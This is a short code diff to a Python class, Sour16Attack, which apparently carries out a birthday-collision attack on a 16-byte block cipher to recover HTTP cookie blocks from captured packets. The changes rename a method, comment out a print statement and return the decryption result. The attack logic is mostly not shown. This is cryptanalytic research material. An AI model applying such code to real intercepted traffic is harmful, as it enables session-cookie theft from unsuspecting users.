@@ -39,7 +39,7 @@ class Sour16Attack:
         }
 
         self.cookie_location = self.get_cookie_block_locations(block_size_bytes)
-        self.index_location = self.get_index_block_locations(block_size_bytes)
+        self.index_location = self.get_request_id_block_locations(block_size_bytes)
         self.date_location = self.get_date_block_locations(block_size_bytes)
 
         self.round_trips = packetfile.read_packets(filename, block_size_bytes)
@@ -58,7 +58,7 @@ class Sour16Attack:
         return Sour16Attack.index_to_block_index(start_index, end_index, block_size)
 
     @staticmethod
-    def get_index_block_locations(block_size):
+    def get_request_id_block_locations(block_size):
         return Sour16Attack.index_to_block_index(17, 27, block_size)
 
     @staticmethod
@@ -128,8 +128,8 @@ class Sour16Attack:
             return
 
         plain = plaintext[block_index]
-        print("Collision found between encryption of block: '{}' and a cookie block."
-              .format(plain.replace("\n", "\\n")))
+        # print("Collision found between encryption of block: '{}' and a cookie block index {}."
+        #      .format(plain.replace("\n", "\\n"), cookie_block["index"]))
 
         if block_index != 0:
             prev = cipher[block_index - 1]
@@ -154,7 +154,7 @@ class Sour16Attack:
 
 def main(filename, block_size_bytes):
     attack = Sour16Attack(filename, block_size_bytes)
-    attack.decrypt_cookie()
+    return attack.decrypt_cookie()
 
 
 if __name__ == "__main__":
